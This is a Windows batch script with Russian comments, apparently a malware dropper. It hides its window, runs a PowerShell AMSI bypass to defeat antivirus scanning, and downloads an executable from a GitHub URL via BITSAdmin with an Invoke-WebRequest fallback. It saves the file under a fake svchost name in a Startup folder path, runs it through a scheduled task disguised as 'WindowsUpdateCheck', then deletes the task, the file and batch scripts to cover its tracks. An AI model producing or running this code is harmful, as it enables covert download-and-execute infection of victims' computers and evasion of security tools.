@echo off
setlocal enabledelayedexpansion

:: Скрываем окно и отключаем эхо
mode con cols=1 lines=1
title 

:: AMSI Bypass (PowerShell)
powershell -nop -w hidden -c "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b};if ($c) {$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like '*Context') {$f=$e.GetValue($null)};if ($f) {$g=[IntPtr]$f.GetType().GetField('m_contextFlags','NonPublic,Static').GetValue($f);if ($g -ne 48) {$f.GetType().GetField('m_contextFlags','NonPublic,Static').SetValue($f,48)}}}}"

:: Создаем временную директорию в AppData (не мониторится так активно)
set "tempdir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\tmp"
if not exist "%tempdir%" mkdir "%tempdir%"

:: Генерируем случайное имя файла для evasion
set /a "rand=%random% * %random%"
set "filename=svchost!rand!.tmp.exe"

:: Скачиваем файл через BITSAdmin (меньше подозрений чем certutil/powershell)
bitsadmin /transfer "SilentJob" /priority normal "https://github.com/defdgobs/farty/raw/refs/heads/main/TaskHost_9b64816d.exe" "%tempdir%\!filename!"

:: Ждем завершения загрузки
:wait
bitsadmin /list | findstr /i "SilentJob" | findstr "Transferred" >nul
if errorlevel 1 timeout /t 1 /nobreak >nul 2>&1 & goto wait

:: Проверяем успешность загрузки
if not exist "%tempdir%\!filename!" (
    :: Fallback через PowerShell Invoke-WebRequest (стелс)
    powershell -nop -w hidden -c "IWR -Uri 'https://github.com/defdgobs/farty/raw/refs/heads/main/TaskHost_9b64816d.exe' -OutFile '%tempdir%\!filename!'"
)

:: Создаем parent process (explorer.exe) для маскировки
start "" "%WINDIR%\explorer.exe"

:: Запускаем через scheduled task для persistence и evasion
schtasks /create /tn "WindowsUpdateCheck" /tr "\"%tempdir%\!filename!\" /b" /sc once /st 00:00 /f /rl limited >nul 2>&1

:: Немедленный запуск через schtasks
schtasks /run /tn "WindowsUpdateCheck" >nul 2>&1

:: Очистка следов (через 10 сек)
timeout /t 10 /nobreak >nul 2>&1
schtasks /delete /tn "WindowsUpdateCheck" /f >nul 2>&1
del "%tempdir%\!filename!" >nul 2>&1
rmdir "%tempdir%" >nul 2>&1

:: Самоуничтожение скрипта
powershell -nop -w hidden -c "rm $env:TMP\*.bat -Force -ErrorAction SilentlyContinue"
exit
